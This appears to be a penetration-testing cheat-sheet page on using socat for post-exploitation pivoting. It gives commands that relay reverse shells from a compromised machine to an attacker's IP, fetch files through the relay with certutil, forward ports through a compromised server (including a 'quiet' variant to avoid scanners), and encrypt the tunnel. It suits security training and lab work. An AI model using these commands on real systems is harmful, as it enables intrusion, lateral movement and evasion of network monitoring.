# socat

Socat is a command line based utility that establishes two bidirectional byte streams and transfers data between them. Because the streams can be constructed from a large set of different types of data sinks and sources (see address types), and because lots of address options may be applied to the streams, socat can be used for many different purposes.

### [Download](../../misc/tools.md#socat)

### Reverse Shell Relay (or Port Relay)

Socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

* Attacker machine: Listen with `nc`
* Comprimised machine: Socat command to relay the shell to the attacker's machine.
* Victim machine: Exploit to send a reverse shell to the compromised computer.

In the following example, we listen on port 8000. If a connection arrives on this port, socat relays to the attacker's machine on port 443:

```bash
./socat tcp-l:8000 tcp:<ATTACKING_IP>:443 &
```

In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.

You can also use it to download a file:

```bash
./socat tcp-l:8000 tcp:<ATTACKING_IP>:80 & # Compromised machine 1
python3 -m http.server 80 # Attacker machine
certutil -urlcache -f -split http://<IP_1_COMPROMISED>/test #Compromised machine 2
```

### Port Forwarding

{% hint style="info" %}
All of the following commands must be executed on the compromised machine.
{% endhint %}

{% tabs %}
{% tab title="Easy" %}
The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server.

```bash
./socat tcp-l:<OPEN_PORT>,fork,reuseaddr tcp:<TARGET_IP>:<TARGET_PORT> &
```

* The **fork** option is used to put every connection into a new process.
* The **reuseaddr** option means that the port stays open after a connection is made to it.

Combined, they allow us to use the same port forward for more than one connection.
{% endtab %}

{% tab title="Quiet" %}
The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

```bash
# On the attacker machine:
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the **fork** and **reuseaddr** options set, to allow us to create more than one connection using this port forward.

```bash
# On the compromised machine:
./socat tcp:<ATTACKING_IP>:8001 tcp:<TARGET_IP>:<TARGET_PORT>,fork &
```

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server.

We can also encrypt it in the following way:

```bash
# Generate certificates:
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
# On the attacker machine:
socat OPENSSL-LISTEN:8001,cert=shell.pem,verify=0 tcp-l:8000,fork,reuseaddr &
# On the compromised machine:
./socat OPENSSL:<ATTACKING_IP>:8001,verify=0 tcp:<TARGET_IP>:<TARGET_PORT>,fork &
```
{% endtab %}
{% endtabs %}

Finally, we've learnt how to create backgrounded socat port forwards and relays, but it's important to also know how to close these. The solution is simple:

```bash
jobs # To obtain the number of the background process.
kill %<NUMBER>
```
